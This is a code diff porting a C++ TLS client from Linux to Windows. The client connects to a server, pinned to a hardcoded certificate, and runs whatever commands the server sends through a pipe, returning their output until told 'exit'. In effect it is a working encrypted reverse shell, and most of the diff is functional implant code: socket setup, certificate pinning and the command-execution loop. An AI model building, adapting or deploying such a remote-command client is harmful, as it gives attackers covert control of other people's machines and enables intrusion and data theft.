@@ -1,13 +1,20 @@
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 #include <iostream>
 #include <cstring>
-#include <unistd.h>
-#include <arpa/inet.h>
 #include <fstream>
 #include <array>
 #include <memory>
 #include <cstdlib>
+#include <windows.h>
+
+// Link with Ws2_32.lib and OpenSSL libraries
+#pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "Crypt32.lib")
+#pragma comment(lib, "libssl.lib")
+#pragma comment(lib, "libcrypto.lib")
 
 // Hardcoded server certificate (PEM format)
 const char *server_cert =
@@ -35,10 +42,13 @@ const char *server_cert =
 
 // Function to write the certificate to a temporary file and clean up later
 std::string write_temp_cert() {
-    std::string cert_path = "/tmp/server_cert.pem";
+    char temp_path[MAX_PATH];
+    GetTempPath(MAX_PATH, temp_path);  // Get the temp path for Windows
+
+    std::string cert_path = std::string(temp_path) + "server_cert.pem";
     std::ofstream cert_file(cert_path);
     if (!cert_file) {
-        perror("Unable to create temporary certificate file");
+        std::cerr << "Unable to create temporary certificate file\n";
         exit(EXIT_FAILURE);
     }
     cert_file << server_cert;
@@ -63,7 +73,7 @@ SSL_CTX *create_context() {
     method = TLS_client_method();
     ctx = SSL_CTX_new(method);
     if (!ctx) {
-        perror("Unable to create SSL context");
+        std::cerr << "Unable to create SSL context\n";
         ERR_print_errors_fp(stderr);
         exit(EXIT_FAILURE);
     }
@@ -91,7 +101,7 @@ std::string execute_command(const std::string &command) {
     std::string result;
 
     // Open a pipe to execute the command
-    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);
+    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(command.c_str(), "r"), _pclose);
     if (!pipe) {
         return "Error: Unable to open pipe.";  // Graceful handling of pipe error
     }
@@ -100,7 +110,6 @@ std::string execute_command(const std::string &command) {
         result += buffer.data();
     }
 
-    // If the command was not found or execution failed, return a message
     if (result.empty()) {
         return "Error: Command not found or execution failed.";
     }
@@ -129,6 +138,12 @@ int main(int argc, char *argv[]) {
         return EXIT_FAILURE;
     }
 
+    WSADATA wsa_data;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
+        std::cerr << "WSAStartup failed.\n";
+        return EXIT_FAILURE;
+    }
+
     initialize_openssl();
 
     SSL_CTX *ctx = create_context();
@@ -136,44 +151,48 @@ int main(int argc, char *argv[]) {
 
     SSL *ssl = SSL_new(ctx);
     if (!ssl) {
-        perror("Unable to create SSL structure");
+        std::cerr << "Unable to create SSL structure\n";
         ERR_print_errors_fp(stderr);
         SSL_CTX_free(ctx);
         cleanup_openssl();
+        WSACleanup();
         return EXIT_FAILURE;
     }
 
     // Code to create a socket and connect to the server
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd < 0) {
-        perror("Unable to create socket");
+    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd == INVALID_SOCKET) {
+        std::cerr << "Unable to create socket\n";
         SSL_free(ssl);
         SSL_CTX_free(ctx);
         cleanup_openssl();
+        WSACleanup();
         exit(EXIT_FAILURE);
     }
 
     struct sockaddr_in addr;
-    std::memset(&addr, 0, sizeof(addr)); // Ensure the structure is zeroed
+    std::memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
 
-    // Convert IP address from text to binary form
-    if (inet_pton(AF_INET, server_address, &addr.sin_addr) <= 0) {
+    addr.sin_addr.s_addr = inet_addr(server_address);
+    if (addr.sin_addr.s_addr == INADDR_NONE) {
         std::cerr << "Invalid address/ Address not supported: " << server_address << "\n";
-        close(sockfd);
+        closesocket(sockfd);
         SSL_free(ssl);
         SSL_CTX_free(ctx);
         cleanup_openssl();
+        WSACleanup();
         exit(EXIT_FAILURE);
     }
 
     if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
-        perror("Connection failed");
-        close(sockfd);
+        std::cerr << "Connection failed\n";
+        closesocket(sockfd);
         SSL_free(ssl);
         SSL_CTX_free(ctx);
         cleanup_openssl();
+        WSACleanup();
         exit(EXIT_FAILURE);
     }
 
@@ -184,41 +203,40 @@ int main(int argc, char *argv[]) {
     } else {
         std::cout << "Connected to server " << server_address << ":" << port << "!\n";
 
+        // Communication logic with the server
         while (true) {
             char buffer[1024] = {0};
             int bytes = SSL_read(ssl, buffer, sizeof(buffer) - 1);
             if (bytes > 0) {
-                buffer[bytes] = '\0'; // Null-terminate the string
+                buffer[bytes] = '\0';
                 std::string command(buffer);
 
-                // Check for exit command to break the loop
                 if (command == "exit") {
                     std::cout << "Exiting client.\n";
-                    break; // Exit if 'exit' command is received
+                    break;
                 }
 
-                // Execute the command and get the result
                 std::string output = execute_command(command);
 
-                // Send the output back to the server
                 if (SSL_write(ssl, output.c_str(), output.length()) <= 0) {
                     std::cerr << "Error writing to server.\n";
                     break;
                 }
             } else if (bytes == 0) {
                 std::cout << "Server closed the connection.\n";
-                break; // Connection closed by server
+                break;
             } else {
                 std::cerr << "Error reading from server.\n";
-                break; // Exit on error
+                break;
             }
         }
     }
 
     SSL_shutdown(ssl);
     SSL_free(ssl);
-    close(sockfd);  // Close the socket when done
+    closesocket(sockfd);
     SSL_CTX_free(ctx);
     cleanup_openssl();
+    WSACleanup();
     return 0;
 }
